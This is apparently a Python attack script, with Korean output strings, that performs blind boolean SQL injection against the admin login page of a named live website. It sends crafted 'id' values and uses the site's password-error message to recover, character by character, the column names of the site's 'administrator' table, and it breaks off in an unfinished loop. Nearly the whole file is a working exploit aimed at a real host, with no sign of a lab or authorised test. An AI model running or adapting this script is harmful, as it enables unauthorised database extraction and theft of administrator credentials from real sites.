import requests
import time

s= requests.Session()

URL ="http://g-learning.co.kr/admin/login/logprocess.jsp"




colum=""
colum_list = []

for i in range(17):
    break_p = 0
    if len(colum) != 0: colum_list.append(colum)
    print (colum_list, i)
    colum=""
    while True:
        low = 48
        high= 126
        while True:
            mid = int((low+high)/2)

            data ={
                "id":"' or (select column_name from information_schema.columns where table_name='administrator' and table_schema=database() limit "+str(i)+",1) like '"+colum+chr(low)+"%'#",
                "pw":"123",
                "url":"null"
            }

            req1=s.post(URL,data=data)
            req1.encoding=None

            if req1.text.find("비밀번호가") >-1 :
                colum= colum+chr(low)
                print (str(i+1)+"번째 colum : "+colum+"...")
                break

            #time.sleep(0.2)

            data ={
                "id":"' or (select column_name from information_schema.columns where table_name='administrator' and table_schema=database() limit "+str(i)+",1) like '"+colum+chr(high)+"%'#",
                "pw":"123",
                "url":"null"
            }
            req1=s.post(URL,data=data)
            req1.encoding=None
            if req1.text.find("비밀번호가") >-1 :
                colum= colum+chr(high)
                print (str(i+1)+"번째 colum : "+colum+"...")
                break

            #time.sleep(0.2)

            data ={
                "id":"' or (select column_name from information_schema.columns where table_name='administrator' and table_schema=database() limit "+str(i)+",1) like '"+colum+chr(mid)+"%'#",
                "pw":"123",
                "url":"null"
            }
            req1=s.post(URL,data=data)
            req1.encoding=None
            if req1.text.find("비밀번호가") >-1 :
                colum= colum+chr(mid)
                print (str(i+1)+"번째 colum : "+colum+"...")
                break

            #time.sleep(0.2)

            data ={
                "id":"' or (select column_name from information_schema.columns where table_name='administrator' and table_schema=database() limit "+str(i)+",1) < '"+colum+chr(mid)+"'#",
                "pw":"123",
                "url":"null"
            }
            req1=s.post(URL,data=data)
            req1.encoding=None
            if req1.text.find("비밀번호가") >-1 :
                high= mid-1
                print("high is now : " + chr(high))

            #time.sleep(0.2)

            data ={
                "id":"' or (select column_name from information_schema.columns where table_name='administrator' and table_schema=database() limit "+str(i)+",1) > '"+colum+chr(mid)+"'#",
                "pw":"123",
                "url":"null"
            }
            req1=s.post(URL,data=data)
            req1.encoding=None
            if req1.text.find("비밀번호가") >-1 :
                low= mid+1
                print ("low is now : "+chr(low))

            #time.sleep(0.2)

            if low >= high :
                print(str(i + 1) + "번째 colum : " +colum+"!!")
                break_p = 1
                break
            #time.sleep(0.2)

        if break_p == 1:
            break

print ("colums are : "+' , '.join(colum_list))

for i in colum_list:



